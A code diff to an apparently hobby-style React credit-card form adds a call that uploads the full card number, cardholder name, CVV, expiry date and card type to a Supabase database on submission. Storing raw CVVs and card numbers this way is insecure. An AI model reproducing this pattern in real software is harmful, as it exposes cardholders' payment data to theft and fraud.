@@ -5,6 +5,7 @@ import Logo1 from "../assets/Mastercard.png"
 import Logo2 from "../assets/Visa.png"
 import Logo3 from "../assets/American.svg.png"
 import { motion } from 'framer-motion';
+import { UploadCards } from '../supabase/uploadCard';
 
 export const Form = () => {
 
@@ -15,7 +16,7 @@ export const Form = () => {
     Numero: "",
     Fecha: "",
     Nombre: "",
-    CVV: ""
+    CVV: "",
   })   
 
 //   funcion para limpiar formulario 
@@ -93,8 +94,17 @@ export const Form = () => {
     // Si no hay errores, se puede enviar el formulario
     if (Object.keys(errors).length === 0) {
       // Aquí puedes manejar la lógica para enviar los datos del formulario
+      UploadCards({
+        Numero: data.Numero,
+        Nombre: data.Nombre,
+        CVV: data.CVV,
+        Fecha: data.Fecha,
+        Tipo: tipoTarjeta
+      })
+      ResetFrom()
+      setIsFlipped(false)
     }
-    console.log(errors)
+
   };
   return (
     <div className='md:w-[680px] w-[95%] h-auto bg-white flex flex-col items-center justify-center rounded-xl border border-black'>
